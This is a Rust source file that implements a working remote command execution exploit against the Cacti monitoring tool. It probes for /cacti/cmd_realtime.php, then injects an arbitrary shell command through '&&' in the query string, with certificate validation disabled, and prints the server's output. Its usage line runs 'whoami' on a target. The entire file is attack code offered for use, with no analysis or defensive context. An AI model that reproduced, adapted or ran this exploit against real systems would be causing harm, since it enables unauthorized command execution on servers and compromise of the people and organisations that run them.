use reqwest::blocking::Client;
use reqwest::Url;
use std::env;
use std::process;

struct CactiValidator {
    client: Client,
}

impl CactiValidator {
    fn new() -> Self {
        let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
        CactiValidator { client }
    }

    fn validate(&self, url: &str) -> bool {
        let endpoint = "/cacti/cmd_realtime.php";
        let full_url = format!("{}{}", url, endpoint);
        let response_from_url = self.client.get(&full_url).send().unwrap();

        if response_from_url.status().is_success() {
            println!("Found Cacti");
            true
        } else {
            //pass
            false
        }
    }
}

struct RemoteCommandExecutor {
    client: Client,
}

impl RemoteCommandExecutor {
    fn new() -> Self {
        let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
        RemoteCommandExecutor { client }
    }

    fn execute(&self, url: &str, command: &str) {
        let parsed_url = Url::parse(url).unwrap();
        let stripped_url = format!("{}://{}", parsed_url.scheme(), parsed_url.host_str().unwrap());
        let payload_cac = format!("{}/cacti/cmd_realtime.php?1+1&&{}+1+1+1", stripped_url, command);

        println!("URL: {}", payload_cac);
        let response = self.client.get(&payload_cac).send().unwrap();
        println!("\n Response:");
        let formatted = response.text().unwrap().replace("<br>", "\n");
        println!("{}", formatted);
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        println!("Usage: app http://site.com/ whoami");
        process::exit(1);
    }

    let url = &args[1];
    let command = &args[2];

    let validator = CactiValidator::new();
    if validator.validate(url) {
        let executor = RemoteCommandExecutor::new();
        executor.execute(url, command);
    }
}
